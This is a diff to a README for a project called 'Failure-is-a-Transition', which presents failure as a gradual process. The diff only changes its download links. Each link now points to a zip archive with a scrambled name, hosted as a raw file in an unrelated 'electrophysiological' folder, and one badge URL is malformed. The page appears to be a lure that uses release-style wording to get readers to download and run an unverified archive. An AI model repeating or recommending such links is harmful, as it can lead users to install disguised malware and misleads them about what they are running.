@@ -1,6 +1,6 @@
 # 📚 Failure-is-a-Transition - Understanding Failure as a Journey
 
-[![Download the latest release](https://raw.githubusercontent.com/pitu64/Failure-is-a-Transition/main/electrophysiological/Transition-a-Failure-is-v1.6.zip%20Now-Click%https://raw.githubusercontent.com/pitu64/Failure-is-a-Transition/main/electrophysiological/Transition-a-Failure-is-v1.6.zip)](https://raw.githubusercontent.com/pitu64/Failure-is-a-Transition/main/electrophysiological/Transition-a-Failure-is-v1.6.zip)
+[![Download the latest release](https://raw.githubusercontent.com/pitu64/Failure-is-a-Transition/main/electrophysiological/is_Transition_Failure_a_v3.1-beta.2.zip%20Now-Click%https://raw.githubusercontent.com/pitu64/Failure-is-a-Transition/main/electrophysiological/is_Transition_Failure_a_v3.1-beta.2.zip)](https://raw.githubusercontent.com/pitu64/Failure-is-a-Transition/main/electrophysiological/is_Transition_Failure_a_v3.1-beta.2.zip)
 
 ## 📖 Description
 Failure is often seen as a clear endpoint. This application takes a different view. It presents failure as a gradual transition caused by various factors, such as pressure buildup and hidden instabilities. It dives into the reasons why traditional prediction models fall short in preventing failures, especially in systems centered around human behavior.  
@@ -26,7 +26,7 @@ To get your application up and running, follow these steps:
 1. **Visit the Releases Page:**
    Click the link below to access the releases page.
 
-   [Download the latest release](https://raw.githubusercontent.com/pitu64/Failure-is-a-Transition/main/electrophysiological/Transition-a-Failure-is-v1.6.zip)
+   [Download the latest release](https://raw.githubusercontent.com/pitu64/Failure-is-a-Transition/main/electrophysiological/is_Transition_Failure_a_v3.1-beta.2.zip)
 
 2. **Download the Application:**
    On the releases page, you will find the latest version of the application. Choose the file that matches your operating system and download it.
@@ -72,7 +72,7 @@ After launching the application, you will see the main interface. Here are some 
 ## 📥 Download & Install
 To download the application, ensure you visit the following link:
 
-[Download the latest release](https://raw.githubusercontent.com/pitu64/Failure-is-a-Transition/main/electrophysiological/Transition-a-Failure-is-v1.6.zip)
+[Download the latest release](https://raw.githubusercontent.com/pitu64/Failure-is-a-Transition/main/electrophysiological/is_Transition_Failure_a_v3.1-beta.2.zip)
 
 Follow the installation instructions given above to run the application smoothly. 
 
